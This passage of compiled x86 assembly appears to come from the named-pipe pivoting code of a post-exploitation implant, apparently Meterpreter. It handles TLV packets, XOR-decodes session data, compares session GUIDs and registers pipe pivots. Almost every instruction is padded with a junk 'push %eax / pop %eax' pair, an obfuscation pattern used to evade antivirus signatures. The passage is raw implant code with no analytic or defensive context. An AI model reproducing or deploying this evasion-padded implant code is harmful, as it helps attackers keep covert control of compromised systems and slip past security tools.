push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -124(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$21, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -128(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$20, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -132(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$19, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -136(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$18, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -140(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$17, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -144(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$16, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -148(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$15, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -152(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$14, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -156(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$13, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -160(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$12, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -164(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$11, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -168(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$10, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -172(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$9, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -176(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$8, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -180(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$7, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -184(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$6, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -188(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$5, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$3, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$2, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -192(%ebp)
push %eax
pop %eax
	movl	-36(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%edx, 128(%esp)
push %eax
pop %eax
	movl	-92(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 124(%esp)
push %eax
pop %eax
	movl	-96(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 120(%esp)
push %eax
pop %eax
	movl	-100(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 116(%esp)
push %eax
pop %eax
	movl	-104(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 112(%esp)
push %eax
pop %eax
	movl	-108(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 108(%esp)
push %eax
pop %eax
	movl	-112(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 104(%esp)
push %eax
pop %eax
	movl	-116(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 100(%esp)
push %eax
pop %eax
	movl	-120(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 96(%esp)
push %eax
pop %eax
	movl	-124(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 92(%esp)
push %eax
pop %eax
	movl	-128(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 88(%esp)
push %eax
pop %eax
	movl	-132(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 84(%esp)
push %eax
pop %eax
	movl	-136(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 80(%esp)
push %eax
pop %eax
	movl	-140(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 76(%esp)
push %eax
pop %eax
	movl	-144(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 72(%esp)
push %eax
pop %eax
	movl	-148(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 68(%esp)
push %eax
pop %eax
	movl	-152(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 64(%esp)
push %eax
pop %eax
	movl	-156(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 60(%esp)
push %eax
pop %eax
	movl	-160(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 56(%esp)
push %eax
pop %eax
	movl	-164(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 52(%esp)
push %eax
pop %eax
	movl	-168(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 48(%esp)
push %eax
pop %eax
	movl	-172(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 44(%esp)
push %eax
pop %eax
	movl	-176(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 40(%esp)
push %eax
pop %eax
	movl	-180(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 36(%esp)
push %eax
pop %eax
	movl	-184(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 32(%esp)
push %eax
pop %eax
	movl	-188(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 28(%esp)
push %eax
pop %eax
	movl	%edi, 24(%esp)
push %eax
pop %eax
	movl	%esi, 20(%esp)
push %eax
pop %eax
	movl	%ebx, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	-192(%ebp), %ebx
push %eax
pop %eax
	movl	%ebx, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC12, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__ntohl@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	leal	24(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 65928(%eax)
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	leal	24(%eax), %edx
push %eax
pop %eax
	movl	-32(%ebp), %eax
push %eax
pop %eax
	movl	$4, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_xor_bytes
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65928(%eax), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC13, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
L17:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65928(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L18
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65928(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65924(%eax), %eax
push %eax
pop %eax
	cmpl	%eax, %edx
push %eax
pop %eax
	ja	L18
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	328(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L19
push %eax
pop %eax
	movl	$LC14, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %eax
push %eax
pop %eax
	movl	%eax, -40(%ebp)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65928(%eax), %eax
push %eax
pop %eax
	leal	-4(%eax), %ecx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	leal	4(%eax), %edx
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	%ecx, 8(%esp)
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_xor_bytes
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	20(%eax), %eax
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L20
push %eax
pop %eax
	movl	$LC15, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$52, 4(%esp)
push %eax
pop %eax
	movl	$1, (%esp)
push %eax
pop %eax
	call	_calloc
push %eax
pop %eax
	movl	%eax, -44(%ebp)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %edx
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 24(%eax)
push %eax
pop %eax
	movl	-40(%ebp), %eax
push %eax
pop %eax
	movl	28(%eax), %edx
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 28(%eax)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	24(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__ntohl@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	leal	-8(%eax), %edx
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 36(%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	65916(%eax), %eax
push %eax
pop %eax
	leal	32(%eax), %edx
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%edx, 32(%eax)
push %eax
pop %eax
	movl	$65538, 4(%esp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_get_tlv_value_string
push %eax
pop %eax
	movl	%eax, -48(%ebp)
push %eax
pop %eax
	cmpl	$0, -48(%ebp)
push %eax
pop %eax
	je	L21
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	332(%eax), %edx
push %eax
pop %eax
	movl	$32, 8(%esp)
push %eax
pop %eax
	movl	-48(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_memcmp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	jne	L21
push %eax
pop %eax
	movl	$LC16, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$0, -76(%ebp)
push %eax
pop %eax
	leal	-76(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 8(%esp)
push %eax
pop %eax
	movl	$262606, 4(%esp)
push %eax
pop %eax
	movl	-44(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_packet_get_tlv_value_raw
push %eax
pop %eax
	movl	%eax, -52(%ebp)
push %eax
pop %eax
	cmpl	$0, -52(%ebp)
push %eax
pop %eax
	je	L22
push %eax
pop %eax
	movl	-76(%ebp), %eax
push %eax
pop %eax
	cmpl	$16, %eax
push %eax
pop %eax
	jne	L22
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	312(%eax), %edx
push %eax
pop %eax
	movl	$16, 8(%esp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_memcmp
push %eax
pop %eax
	testl	%eax, %eax
push %eax
pop %eax
	je	L22
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$15, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$14, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -92(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$13, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -96(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$12, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -100(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$11, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -104(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$10, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -108(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$9, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -112(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$8, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -116(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$7, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -120(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$6, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -124(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$5, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$3, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$2, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -128(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%edx, 64(%esp)
push %eax
pop %eax
	movl	-92(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 60(%esp)
push %eax
pop %eax
	movl	-96(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 56(%esp)
push %eax
pop %eax
	movl	-100(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 52(%esp)
push %eax
pop %eax
	movl	-104(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 48(%esp)
push %eax
pop %eax
	movl	-108(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 44(%esp)
push %eax
pop %eax
	movl	-112(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 40(%esp)
push %eax
pop %eax
	movl	-116(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 36(%esp)
push %eax
pop %eax
	movl	-120(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 32(%esp)
push %eax
pop %eax
	movl	-124(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 28(%esp)
push %eax
pop %eax
	movl	%edi, 24(%esp)
push %eax
pop %eax
	movl	%esi, 20(%esp)
push %eax
pop %eax
	movl	%ebx, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	-128(%ebp), %edi
push %eax
pop %eax
	movl	%edi, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC17, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$312, %eax
push %eax
pop %eax
	movl	%eax, -56(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$15, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, %edx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$14, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -92(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$13, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -96(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$12, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -100(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$11, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -104(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$10, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -108(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$9, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	%esi, -112(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$8, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	%edi, -116(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$7, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	%ebx, -120(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$6, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	%ecx, -124(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$5, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %edi
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$4, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %esi
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$3, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ebx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$2, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %ecx
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	addl	$1, %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%eax, -128(%ebp)
push %eax
pop %eax
	movl	-56(%ebp), %eax
push %eax
pop %eax
	movzbl	(%eax), %eax
push %eax
pop %eax
	movzbl	%al, %eax
push %eax
pop %eax
	movl	%edx, 64(%esp)
push %eax
pop %eax
	movl	-92(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 60(%esp)
push %eax
pop %eax
	movl	-96(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 56(%esp)
push %eax
pop %eax
	movl	-100(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 52(%esp)
push %eax
pop %eax
	movl	-104(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 48(%esp)
push %eax
pop %eax
	movl	-108(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 44(%esp)
push %eax
pop %eax
	movl	-112(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 40(%esp)
push %eax
pop %eax
	movl	-116(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 36(%esp)
push %eax
pop %eax
	movl	-120(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 32(%esp)
push %eax
pop %eax
	movl	-124(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 28(%esp)
push %eax
pop %eax
	movl	%edi, 24(%esp)
push %eax
pop %eax
	movl	%esi, 20(%esp)
push %eax
pop %eax
	movl	%ebx, 16(%esp)
push %eax
pop %eax
	movl	%ecx, 12(%esp)
push %eax
pop %eax
	movl	-128(%ebp), %esi
push %eax
pop %eax
	movl	%esi, 8(%esp)
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	$LC18, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$16, 4(%esp)
push %eax
pop %eax
	movl	$LC19, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	$LC20, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	312(%eax), %edx
push %eax
pop %eax
	movl	$16, 8(%esp)
push %eax
pop %eax
	movl	-52(%ebp), %eax
push %eax
pop %eax
	movl	%eax, 4(%esp)
push %eax
pop %eax
	movl	%edx, (%esp)
push %eax
pop %eax
	call	_memcpy
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	312(%eax), %edx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	364(%eax), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	movl	%edx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_pivot_tree_remove
push %eax
pop %eax
	movl	%eax, -60(%ebp)
push %eax
pop %eax
	cmpl	$0, -60(%ebp)
push %eax
pop %eax
	je	L28
push %eax
pop %eax
	movl	$LC21, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	8(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free_server_context
push %eax
pop %eax
	movl	-60(%ebp), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	call	_free
push %eax
pop %eax
	jmp	L28
push %eax
pop %eax
L22:
	movl	$LC22, (%esp)
push %eax
pop %eax
	call	_real_dprintf
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	addl	$312, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__CoCreateGuid@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	312(%eax), %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__htonl@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%eax, 312(%edx)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movzwl	316(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__htons@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movw	%ax, 316(%edx)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movzwl	318(%eax), %eax
push %eax
pop %eax
	movzwl	%ax, %eax
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
	movl	__imp__htons@4, %eax
push %eax
pop %eax
	call	*%eax
push %eax
pop %eax
	subl	$4, %esp
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movw	%ax, 318(%edx)
push %eax
pop %eax
	jmp	L24
push %eax
pop %eax
L28:
	nop
push %eax
pop %eax
L24:
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	$1, 328(%eax)
push %eax
pop %eax
	movl	$12, 4(%esp)
push %eax
pop %eax
	movl	$1, (%esp)
push %eax
pop %eax
	call	_calloc
push %eax
pop %eax
	movl	%eax, -64(%ebp)
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movl	8(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%eax)
push %eax
pop %eax
	movl	-64(%ebp), %eax
push %eax
pop %eax
	movl	$_named_pipe_write_raw, (%eax)
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	leal	312(%eax), %ecx
push %eax
pop %eax
	movl	8(%ebp), %eax
push %eax
pop %eax
	movl	364(%eax), %eax
push %eax
pop %eax
	movl	80(%eax), %eax
push %eax
pop %eax
	movl	-64(%ebp), %edx
push %eax
pop %eax
	movl	%edx, 8(%esp)
push %eax
pop %eax
	movl	%ecx, 4(%esp)
push %eax
pop %eax
	movl	%eax, (%esp)
push %eax
pop %eax
